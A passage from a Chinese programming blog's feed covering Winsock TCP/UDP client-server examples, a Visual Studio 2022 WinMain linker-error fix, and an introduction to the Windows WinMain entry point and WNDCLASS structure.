iLen = <span class="built_in">send</span>(sockConn, sendBUf, <span class="built_in">strlen</span>(sendBUf),<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    iLen = <span class="built_in">recv</span>(sockConn, recvBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;recvBuf: %s&quot;</span>, recvBuf);</span><br><span class="line">    <span class="comment">//关闭子对象</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sockConn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sprintf_s(sendBUf, 100, &quot;Welcome %s to China!&quot;, inet_ntoa(addCli.sin_addr));</code><br>让他显示我们连接的ip地址。</p><img src="/2022/07/09/socket/006.png" class=""><p>可以看到成功显示了。</p><hr><h3 id="listen-5"><a href="#listen-5" class="headerlink" title="listen 5"></a>listen 5</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;listen errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务器监听的时候设置5的目的是为了，设置一个最大队列，让客户机有序的连接，并且不超过他的队列数。<br>说人话就是设置了瞬时访问人员数，等有人走了在放人进来。<br>另外像我们这种个人电脑，监听数设置太大电脑也无法承载。</p><p>自己搞测试的话可以在服务器listen下面加个sleep延时，然后快速打开超过五个客户端，看看是不是只有前面五个连上了，后面的要想连就只能等前面的结束了。</p><p>客户端加个暂停，避免超过5个连不上直接return -1结束程序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造socket对象</span></span><br><span class="line">SOCKET sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端加个延时和提示。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span>(SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;listen errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sleep start!\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);<span class="comment">//20s</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sleep end!\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后先启动服务端，在快速打开多个客户端</p><img src="/2022/07/09/socket/007.png" class=""><p>额前面连接成功的结束的有点快自动就关闭了，<br>但是没关系，能看到总共还是成功连了5个客户端，第六个就报错了10061，也就是前面说过的问题，被计算机拒绝了。<br>然后其实就能想到，结束了访问之后在打开客户端连接只要没超过都是可以的。</p><img src="/2022/07/09/socket/008.png" class=""><p>end就闪了，但是好在服务端有提示，能看到除了之前快速打开的六个最后一个没连上，后面等前面五个都结束了，再去重新连接是能够连接上的。</p><p>这其实就挺像高并发的情况。</p><hr><h3 id="优化写法"><a href="#优化写法" class="headerlink" title="优化写法"></a>优化写法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">MySocketRecv</span><span class="params">(<span class="type">int</span> sock, <span class="type">char</span> *buf, <span class="type">int</span> dateSize)</span></span>&#123;</span><br><span class="line"><span class="comment">//循环接收</span></span><br><span class="line"><span class="type">int</span> numRecvSoFar = <span class="number">0</span>;<span class="comment">//目前接收到的数据</span></span><br><span class="line"><span class="type">int</span> numsRemainingToRecv = dateSize;<span class="comment">//剩余要接受的数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter MySocketRecv\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="type">int</span> byteRead = <span class="built_in">recv</span>(sock, &amp;buf[numRecvSoFar], numsRemainingToRecv, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;###bytesRead = %d, numsRecvSoFar = %d, numsRemainingToRecv = %d\m&quot;</span>,</span><br><span class="line">   byteRead, numRecvSoFar, numsRemainingToRecv);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (byteRead == numsRemainingToRecv)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//0则表示一次性接收完成</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (byteRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">numRecvSoFar += byteRead;</span><br><span class="line">numsRemainingToRecv -= byteRead;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((byteRead &lt; <span class="number">0</span>) &amp;&amp; (errno == EAGAIN))&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>recv和send都可以通过相同路数。<br>其目的就是应对大型数据传输时，有特殊情况没全部传过来就断了，这样写可以分流缓冲。</p><hr><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>前面写的其实都是tcp的操作，udp相对而言用的少。</p><img src="/2022/07/09/socket/009.png" class=""><p>看上去比tcp少了一些。</p><hr><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//初始化网络库</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;UDPServer!\n&quot;</span>);</span><br><span class="line">WORD wVersion;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersion = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);<span class="comment">//使用winsock2，故此版本都选择2</span></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersion, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字tcp采用流udp采用报文</span></span><br><span class="line">SOCKET sockSrv = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSrv)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//bind 分配地址和端口</span></span><br><span class="line">SOCKADDR_IN addrSrv;</span><br><span class="line">addrSrv.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);<span class="comment">//地址族 h:hosts to n:net l:long</span></span><br><span class="line">addrSrv.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">6001</span>);<span class="comment">//端口号,0-1024保留</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSrv, (SOCKADDR *)&amp;addrSrv, <span class="built_in">sizeof</span>(SOCKADDR_IN)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind errorNum = %d\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//阻塞等待接收数据</span></span><br><span class="line">SOCKADDR_IN addrCli;<span class="comment">//存储目的套接字的地址族</span></span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//收</span></span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//发</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">recvfrom</span>(sockSrv, recvBuf, <span class="number">100</span>, <span class="number">0</span>, (SOCKADDR *) &amp;addrCli, &amp; len);<span class="comment">//直接接收主机</span></span><br><span class="line">std::cout &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf_s</span>(sendBuf, <span class="number">100</span>, <span class="string">&quot;Ack:%s&quot;</span>, recvBuf);</span><br><span class="line"><span class="built_in">sendto</span>(sockSrv, sendBuf, <span class="built_in">strlen</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (SOCKADDR*)&amp;addrCli, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockSrv);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//初始化网络库</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UDPClient!\n&quot;</span>);</span><br><span class="line">WORD wVersion;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersion = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);<span class="comment">//使用winsock2，故此版本都选择2</span></span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersion, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">SOCKET sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充地址和端口</span></span><br><span class="line">SOCKADDR_IN addrSrv;</span><br><span class="line">addrSrv.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//地址族 本地回环地址</span></span><br><span class="line">addrSrv.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">6001</span>);<span class="comment">//端口号,0-1024保留</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">100</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line"><span class="built_in">sendto</span>(sockCli, sendBuf, <span class="built_in">strlen</span>(sendBuf) + <span class="number">1</span>, <span class="number">0</span>, (SOCKADDR *)&amp;addrSrv, len);</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收数据</span></span><br><span class="line"><span class="built_in">recvfrom</span>(sockCli, recvBuf, <span class="number">100</span>, <span class="number">0</span>, (SOCKADDR *)&amp;addrSrv, &amp;len);</span><br><span class="line">std::cout &lt;&lt; recvBuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockCli);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>其实很多东西都是相对应的，直接搬过来改一下就行了，所以感觉都没记住hh</strong></p><hr><p>测试</p><img src="/2022/07/09/socket/010.png" class=""><p>ok，连接成功。</p><img src="/2022/07/09/socket/011.png" class=""><p>多搞几个也没啥事，只不过客户端没加<code>system(&quot;pause&quot;)</code>去暂停，所以估计打开就是一闪而过了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>也不好说到底要不要记这么详细，先凑合过吧，等有需要回头再看看。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vs2022空项目构建windows窗口报错</title>
      <link href="/2022/07/07/winNewNulProj/"/>
      <url>/2022/07/07/winNewNulProj/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>空项目的设置基本都是套console的，所以run不起来</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="批注不一致"><a href="#批注不一致" class="headerlink" title="批注不一致"></a>批注不一致</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPreInstance, _In_ LPSTR CmdLine, _In_ <span class="type">int</span> nCmdShow</span><br></pre></td></tr></table></figure><p>将WinMain里面的参数改成这样。</p><p><strong>此方法不实用，后面改了即便不用这个也没影响</strong></p><hr><h2 id="LNK2019"><a href="#LNK2019" class="headerlink" title="LNK2019"></a>LNK2019</h2><p><strong>无法解析的外部符号 _main，函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中引用了该符号</strong></p><p>原有就是前言提到的，main函数是非图形化入库，windows的入口时WinMain。</p><p>所以要在项目属性里修改</p><img src="/2022/07/07/winNewNulProj/000.png" class=""><p>将其修改为<code>_WINDOWS</code>原先是console的</p><img src="/2022/07/07/winNewNulProj/001.png" class=""><p>同样的切换就好</p><img src="/2022/07/07/winNewNulProj/002.png" class=""><p>编码一般情况下不要动</p><img src="/2022/07/07/winNewNulProj/003.png" class=""><p>工具集虽然这里显示143，但是如果装的是142之类的应该是会向下兼容的，毕竟这个143现在还很杂有很多小版本。</p><p>除此之外其余的就不动了，然后之前写的就能编译了。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hInstance, </span></span></span><br><span class="line"><span class="params"><span class="function">HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">PSTR lpCmdLine, </span></span></span><br><span class="line"><span class="params"><span class="function">INT nCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       <span class="comment">//这个写不写好像问题不大了。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>小问题，但是费了点时间。。。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows窗口</title>
      <link href="/2022/07/07/win-windows/"/>
      <url>/2022/07/07/win-windows/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>额总的来说c++的语法是又看了一遍~~猪脑子啊有些就是没记住。<br>先看看windows的api，然后玩玩老的mfc先吧。</p><span id="more"></span><hr><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul><li>微软开发文档<br><a href="https://docs.microsoft.com/zh-cn/">文档地址</a></li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>白天没起来，下午game了一会，然后又刷手机。</p><hr><p>windows程序设计就是c++类的形式封装成windowsAPI，然后设计的应用程序框架。减少程序开发的工作量。</p><p>对于没有图形化的命令行界面，程序入口都在main函数<br>而对于windows而言，它的入口在WinMain。</p><p>对于winmain的介绍，在没有引用文件下，可以去官方文档查看</p><img src="/2022/07/07/win-windows/000.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">wWinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, <span class="type">int</span> nCmdShow)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>hInstance 称为“实例句柄”或“模块句柄”。操作系统使用此值在内存中加载可执行文件时标识可执行文件 (EXE) 。 某些Windows函数需要实例句柄，例如加载图标或位图。</li><li>hPrevInstance 没有意义。 它在 16 位Windows中使用，但现在始终为零。</li><li>pCmdLine 包含命令行参数作为 Unicode 字符串。</li><li>nCmdShow 是一个标志，指示主应用程序窗口是最小化、最大化还是正常显示。</li></ul><p>这是大概的情况。然后要使用windows的功能，自然要引用头文件<code>windows.h</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数暂时没有做，然后如果想要标准输入输出也可以用<code>&lt;stdio.h&gt;</code>or<code>&lt;iostream&gt;</code></p><p>因为是以c++类的方式封装，在名字上会有相似</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">()</span></span>&#123;</span><br><span class="line">WNDCLASS wndclass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以右键一直查询定义，也可以直接在文档搜，本质上是一个结构体。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WNDCLASS</span> &#123;</span><br><span class="line"> UINT style; </span><br><span class="line"> WNDPROC lpfnWndProc; </span><br><span class="line"> <span class="type">int</span> cbClsExtra; </span><br><span class="line"> <span class="type">int</span> cbWndExtra; </span><br><span class="line"> HANDLE hInstance; </span><br><span class="line"> HICON hIcon; </span><br><span class="line"> HCURSOR hCursor; </span><br><span class="line"> HBRUSH hbrBackground; </span><br><span class="line"> LPCTSTR lpszMenuName; </span><br><span class="line"> LPCTSTR lpszClassName; &#125; WNDCLASS ;</span><br></pre></td></tr></table></figure><p><strong>英语不好多翻译一下。。。windows的封装一堆参数太哈人了。</strong></p><hr><p>题外话，空项目创建写代码如果编译有问题，可以看我另一篇的解决方法。</p><hr><img src="/2022/07/07/win-windows/004.png" class=""><p>可以打开这个功能，有的时候方便直接看封装好的是如何定义的。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 